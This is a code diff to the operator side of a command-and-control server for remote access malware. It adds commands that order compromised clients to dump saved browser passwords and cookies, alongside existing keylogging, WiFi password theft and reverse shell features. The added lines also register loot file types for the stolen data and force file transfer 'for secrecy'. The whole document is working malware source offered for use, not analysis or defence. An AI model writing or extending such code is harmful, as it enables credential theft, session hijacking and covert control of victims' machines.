@@ -295,7 +295,9 @@ class LootManager:
             'microphone': '.wav',
             'keylog': '.txt',
             'file': '.bin',
-            'dump': '.dmp'
+            'dump': '.dmp',
+            'cookies': '.json',
+            'passwords': '.json'
         }
         return extensions.get(loot_type, '.bin')
 
@@ -399,6 +401,9 @@ class CommandParser:
             'elevate': self.cmd_elevate,
             'unelevate': self.cmd_unelevate,
             'abort': self.cmd_abort,
+            'passwords': self.cmd_passwords,
+            'cookies': self.cmd_cookies,
+            'browser_cookies': self.cmd_cookies,
             'broadcast': self.cmd_broadcast,
             'script': self.cmd_script,
             'sleep': self.cmd_sleep,
@@ -500,6 +505,8 @@ ADVANCED C2 SERVER - COMMAND REFERENCE
   wifi                 - Dump all saved WIFI passwords
   revshell <ip> <port> - Spawn external reverse shell
   socks <port>         - Start SOCKS4 proxy on client
+  passwords            - Dump saved browser passwords
+  cookies [url]        - Dump browser cookies (optional filter)
   exit/quit            - Exit server
   help/?               - Show this help
 """)
@@ -836,6 +843,38 @@ ADVANCED C2 SERVER - COMMAND REFERENCE
             self.server.logger.error("No client selected")
             return True
         self.server.send_command(self.server.selected_client, 'wifi_passwords', {})
+        return True
+
+    def cmd_passwords(self, args):
+        """Dump browser passwords"""
+        if not self.server.selected_client:
+            self.server.logger.error("No client selected")
+            return True
+        # Force file mode for secrecy and reliability
+        self.server.send_command(self.server.selected_client, 'browser_passwords', {'as_file': True})
+        return True
+
+    def cmd_cookies(self, args):
+        """Dump browser cookies"""
+        if not self.server.selected_client:
+            self.server.logger.error("No client selected")
+            return True
+        
+        url_filter = ""
+        live = False
+        
+        for arg in args:
+            if arg.lower() == 'live':
+                live = True
+            else:
+                url_filter = arg
+                
+        # Force as_file for cookies as they are usually large
+        self.server.send_command(self.server.selected_client, 'browser_cookies', {
+            'url': url_filter, 
+            'as_file': True,
+            'live': live
+        })
         return True
 
     def cmd_revshell(self, args):
